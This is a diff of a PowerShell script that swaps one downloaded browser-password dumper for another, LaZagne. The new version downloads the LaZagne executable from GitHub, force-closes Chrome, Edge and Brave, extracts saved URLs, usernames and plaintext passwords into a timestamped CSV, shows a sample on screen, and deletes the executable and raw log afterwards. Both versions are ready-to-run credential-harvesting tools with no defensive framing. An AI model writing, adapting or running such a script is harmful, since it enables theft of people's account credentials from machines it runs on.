@@ -1,56 +1,131 @@
-# BrowserPasswordDump Automated Download and Execution
-Write-Host "Downloading and running BrowserPasswordDump..." -ForegroundColor Green
+# Automated Browser Password Extraction Using LaZagne Executable
+# Downloads LaZagne.exe, runs it for browsers, parses output to CSV
+# Requires PowerShell 7+; run as admin for best results
+# Outputs to timestamped CSV
 
-$tempDir = "$env:TEMP\BrowserPasswordDump"
-$bpdUrl = "https://github.com/priyankchheda/BrowserPasswordDump/releases/download/v1.0/BrowserPasswordDump.exe"
-$outputFile = ".\BrowserPasswordDump_Results.csv"
+param(
+    [string]$OutputDir = ".\"
+)
 
-New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+# Generate timestamp for output files
+$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+$csvPath = Join-Path $OutputDir "LaZagne_BrowserPasswords_$timestamp.csv"
+$lazagneExe = ".\LaZagne.exe"
 
-try {
-    # Download BrowserPasswordDump
-    Write-Host "Downloading BrowserPasswordDump..." -ForegroundColor Yellow
-    $exePath = "$tempDir\BrowserPasswordDump.exe"
-    Invoke-WebRequest -Uri $bpdUrl -OutFile $exePath -UseBasicParsing
-    
-    if (Test-Path $exePath) {
-        Write-Host "Running BrowserPasswordDump..." -ForegroundColor Green
-        
-        # Run the tool
-        $result = & $exePath | Out-String
-        
-        if ($result -match "Found (\d+) passwords") {
-            $passwordCount = $matches[1]
-            Write-Host "Successfully recovered $passwordCount passwords!" -ForegroundColor Green
-            
-            # Parse the output and create CSV
-            $csvData = @()
-            $lines = $result -split "`n" | Where-Object { $_ -match "\|" -and $_ -notmatch "Website" }
-            
-            foreach ($line in $lines) {
-                $parts = $line -split "\|" | ForEach-Object { $_.Trim() }
-                if ($parts.Count -ge 4) {
-                    $csvData += [PSCustomObject]@{
-                        Browser = $parts[0]
-                        URL = $parts[1]
-                        Username = $parts[2]
-                        Password = $parts[3]
-                    }
-                }
-            }
-            
-            $csvData | Export-Csv $outputFile -NoTypeInformation
-            Write-Host "Saved to: $outputFile" -ForegroundColor Green
-            
-            # Show sample
-            $csvData | Select-Object -First 5 | Format-Table -AutoSize
-        } else {
-            Write-Host "No passwords were recovered." -ForegroundColor Yellow
-            Write-Host "Raw output: $result" -ForegroundColor Gray
+# Function to close browser processes
+function Close-BrowserProcesses {
+    Write-Host "Closing browser processes..." -ForegroundColor Yellow
+    $browserProcesses = @("chrome", "msedge", "brave")
+    foreach ($proc in $browserProcesses) {
+        try {
+            Get-Process -Name $proc -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+            Start-Sleep -Milliseconds 500
+        } catch {
+            Write-Warning "Could not stop $proc: $($_.Exception.Message)"
         }
     }
-} catch {
-    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
-} finally {
-    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
 }
+
+# Function to download LaZagne executable
+function Download-LaZagne {
+    Write-Host "Downloading LaZagne executable..." -ForegroundColor Yellow
+    try {
+        # Latest release: v2.4.5 (update URL if newer version available; check https://github.com/AlessandroZ/LaZagne/releases)
+        $releaseUrl = "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.5/LaZagne.exe"
+        Invoke-WebRequest -Uri $releaseUrl -OutFile $lazagneExe -UseBasicParsing -ErrorAction Stop
+        Write-Host "LaZagne downloaded successfully." -ForegroundColor Green
+        return $true
+    } catch {
+        Write-Warning "Failed to download LaZagne: $($_.Exception.Message)"
+        return $false
+    }
+}
+
+# Function to run LaZagne and parse output
+function Run-LaZagne {
+    Write-Host "Running LaZagne to extract browser passwords..." -ForegroundColor Yellow
+    try {
+        # Run LaZagne for browsers only, output to console (use -oA for all formats if needed)
+        $output = & $lazagneExe browsers 2>&1
+        $output | Out-File ".\lazagne_output_$timestamp.txt" -Force  # Save raw output for debugging
+        
+        # Parse output for browser passwords (LaZagne outputs in a structured text format)
+        $allPasswords = @()
+        $lines = $output -split "`n"
+        $currentBrowser = ""
+        foreach ($line in $lines) {
+            if ($line -match "^\[.*\] (Chrome|Edge|Brave|Firefox|Opera)") {
+                $currentBrowser = $matches[1]
+            } elseif ($line -match "URL:\s*(.+?)\s+Login:\s*(.+?)\s+Password:\s*(.+?)$") {
+                $allPasswords += [PSCustomObject]@{
+                    Browser = $currentBrowser
+                    URL = $matches[1].Trim()
+                    Username = $matches[2].Trim()
+                    Password = $matches[3].Trim()
+                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                }
+            }
+        }
+        
+        if ($allPasswords.Count -gt 0) {
+            $allPasswords | Export-Csv -Path $csvPath -NoTypeInformation -Force
+            Write-Host "Passwords exported to: $csvPath" -ForegroundColor Green
+            return $allPasswords
+        } else {
+            Write-Warning "No passwords parsed from LaZagne output. Check raw file: laZagne_output_$timestamp.txt"
+            return @()
+        }
+    } catch {
+        Write-Warning "LaZagne execution failed: $($_.Exception.Message)"
+        return @()
+    }
+}
+
+# Main execution
+Write-Host "Automated Browser Password Extraction with LaZagne" -ForegroundColor Green
+Write-Host "=================================================`n" -ForegroundColor Green
+
+# Check PowerShell version
+if ($PSVersionTable.PSVersion.Major -lt 7) {
+    Write-Host "This script requires PowerShell 7 or later. Run with 'pwsh.exe'." -ForegroundColor Red
+    exit 1
+}
+
+# Close browsers
+Close-BrowserProcesses
+
+# Download LaZagne
+if (-not (Download-LaZagne)) {
+    Write-Host "Failed to download LaZagne. Exiting." -ForegroundColor Red
+    exit 1
+}
+
+# Run extraction
+$allPasswords = Run-LaZagne
+
+# Display results
+if ($allPasswords.Count -gt 0) {
+    Write-Host "`nSuccessfully processed $($allPasswords.Count) password entries:`n" -ForegroundColor Green
+    $allPasswords | Select-Object -First 10 | Format-Table -Property Browser, URL, Username, Password -AutoSize
+    
+    # Summary by browser
+    $browserStats = $allPasswords | Group-Object Browser | ForEach-Object {
+        [PSCustomObject]@{
+            Browser = $_.Name
+            Passwords = $_.Count
+        }
+    }
+    Write-Host "`nPassword Summary by Browser:" -ForegroundColor Cyan
+    $browserStats | Format-Table -AutoSize
+} else {
+    Write-Host "`nNo passwords found or processed." -ForegroundColor Yellow
+}
+
+# Cleanup
+Remove-Item $lazagneExe -Force -ErrorAction SilentlyContinue
+Remove-Item ".\lazagne_output_$timestamp.txt" -Force -ErrorAction SilentlyContinue
+
+Write-Host "`nNotes:" -ForegroundColor Cyan
+Write-Host "1. LaZagne.exe is deleted after use." -ForegroundColor Cyan
+Write-Host "2. Run as admin for full access to encrypted passwords." -ForegroundColor Cyan
+Write-Host "3. If no passwords are found, ensure browsers have saved credentials." -ForegroundColor Cyan
